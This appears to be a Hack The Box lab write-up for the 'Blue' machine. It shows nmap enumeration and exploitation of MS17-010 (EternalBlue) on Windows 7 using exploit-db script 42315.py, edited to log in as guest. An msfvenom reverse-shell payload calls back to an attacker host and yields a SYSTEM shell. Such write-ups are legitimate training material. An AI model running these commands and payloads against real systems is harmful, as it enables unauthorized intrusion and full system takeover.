# Blue
[This](https://app.hackthebox.com/machines/Blue) machine appears to be pretty similar to the [Legacy](https://app.hackthebox.com/machines/2) machine (writeup [here](../legacy/legacy.md)) as both these machines are based on exploiting MS17-010. But there is a slight different here that the machine is running Windows 7 rather than Windows XP which changes how we exploit it.

## Enumeration
The first thing that we must do is run a full port scan to determine all the open ports.

```
┌──(kali㉿kali)-[~/Desktop/htb/blue]
└─$ sudo nmap -p- -T4 -sS -oG open_ports 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up (0.21s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 832.27 seconds
```

The next thing that can be done is to run an in-depth scan for all the ports that are open.

```
┌──(kali㉿kali)-[~/Desktop/htb/blue]
└─$ sudo nmap -p135,139,445,49152,49153,49154,49155,49156,49157 -sV -sC -O -oG port_details 10.10.10.40
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 19:33 EDT
Nmap scan report for 10.10.10.40
Host is up (0.14s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 7 Ultimate SP1 or Windows 8.1 Update 1 (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-19T23:34:50
|_  start_date: 2022-08-19T23:15:28
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-08-20T00:34:52+01:00
|_clock-skew: mean: -19m57s, deviation: 34m36s, median: 1s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.51 seconds
```

It can be seen that SMBc2 is running on the target machine. So, we can use `nmap` scripts to determine whether the target is vulnerable.

```
┌──(kali㉿kali)-[~/Desktop/htb/blue]
└─$ sudo nmap -p139,445 --script smb-vuln* 10.10.10.40                                                 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 19:36 EDT
Nmap scan report for 10.10.10.40
Host is up (0.11s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 16.04 seconds
```

Here, it can be seen that the machine is vulnerable to CVE-2017-0143. 

## Gaining Foothold

To get access over the machine we can use many of the exploits that are prublicly available. I tried using the [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010) but didn't work for me. So, had to look at some other exploit. 
We can use `searchsploit` and see if something useful appears there.

```
┌──(kali㉿kali)-[~/Desktop/htb/blue]
└─$ searchsploit ms17-010
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)      | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)   | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Ex | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (M | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution | windows_x86-64/remote/41987.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The `windows/remote/42315.py` appears to be useful (I tried the `windows/remote/2031.py` as well but it didn't work). We can copy it to our working directory

```
┌──(kali㉿kali)-[~/Desktop/htb/blue]
└─$ searchsploit -m 42315
  Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)
      URL: https://www.exploit-db.com/exploits/42315
     Path: /usr/share/exploitdb/exploits/windows/remote/42315.py
File Type: Python script, ASCII text executable

Copied to: /home/kali/Desktop/htb/blue/42315.py
```

And then try to run it.
*As this exploit is pretty old it can be assumed that it would run with Python2.7 instead of Python3.*

```
┌──(kali㉿kali)-[~/Desktop/htb/blue]
└─$ python2.7 42315.py            
Traceback (most recent call last):
  File "42315.py", line 3, in <module>
    from mysmb import MYSMB
ImportError: No module named mysmb
```

But it looks like it is trying to read from some other file as well. We can download this file from [here](https://github.com/worawit/MS17-010/blob/master/mysmb.py).

```
┌──(kali㉿kali)-[~/Desktop/htb/blue]
└─$ python2.7 42315.py
42315.py <ip> [pipe_name]
                                                                                                                     
┌──(kali㉿kali)-[~/Desktop/htb/blue]
└─$ python2.7 42315.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
Not found accessible named pipe
Done
```

Still it looks like we are not able to perform the exploit. So, we can try to take a look at the source-code and see if we can fix it. So, we need to do 2 things to make this executable work.

1. Determine a username/password pair so that the script can access the SMB share.
2. Create a reverse shell payload and send it over to the target to get it executed.

Throughout our enumeration up till this point we did not find any user details so can try using `guest` username and see if it works. To do so we just need to add `guest` as the value of `USERNAME` in the exploit script.

```
    36	USERNAME = 'guest'
    37	PASSWORD = ''
```

Once updated, we can test the script:

```
┌──(kali㉿kali)-[~/Desktop/htb/blue]
└─$ python2.7 42315.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: samr
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8003f51020
SESSION: 0xfffff8a00c119260
FLINK: 0xfffff8a001132048
InParam: 0xfffff8a008c7915c
MID: 0x70b
unexpected alignment, diff: 0x-7b47fb8
leak failed... try again
CONNECTION: 0xfffffa8003f51020
SESSION: 0xfffff8a00c119260
FLINK: 0xfffff8a008ca4088
InParam: 0xfffff8a008c9e15c
MID: 0x803
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Done
```

It looks like the script is able to get access to the machine but we need to create our own payload for reverse connection and send it to the target via this script. We can create the payload using `msfvenom` as shown below:

```
┌──(kali㉿kali)-[~/Desktop/htb/blue]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=1337 -f exe > exp.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

After the payload is created, we need to add the same to the script as well.

```
922	smb_send_file(smbConn, '/home/kali/Desktop/htb/blue/exp.exe', 'C', '/exp.exe')
923	service_exec(conn, r'cmd /c c:\exp.exe')
```

Once all this is done, we need to start a listener (`nc -nlvp 1337`) and run the script.

```
┌──(kali㉿kali)-[~/Desktop/htb/blue]
└─$ python2.7 42315.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: samr
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8003f795e0
SESSION: 0xfffff8a001b1f060
FLINK: 0xfffff8a001549088
InParam: 0xfffff8a00154315c
MID: 0x4c01
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Opening SVCManager on 10.10.10.40.....
Creating service hNkF.....
Starting service hNkF.....
The NETBIOS connection with the remote host timed out.
Removing service hNkF.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```

Before the script finishes, we get our reverse shell

```
┌──(kali㉿kali)-[~/Desktop/htb/blue]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.40] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

And we have access as `nt authority\system`. We can access both the user and root flags easily.

## Some Key Points to Take Away
1. Try to read the source-code of the exploit and modify them if they are not working and you are sure that they should work.

## References
1. [Blue](https://app.hackthebox.com/machines/Blue)
2. [AutoBlue MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
3. [42315.py](https://www.exploit-db.com/exploits/42315)
4. [mysmb.py](https://github.com/worawit/MS17-010/blob/master/mysmb.py)
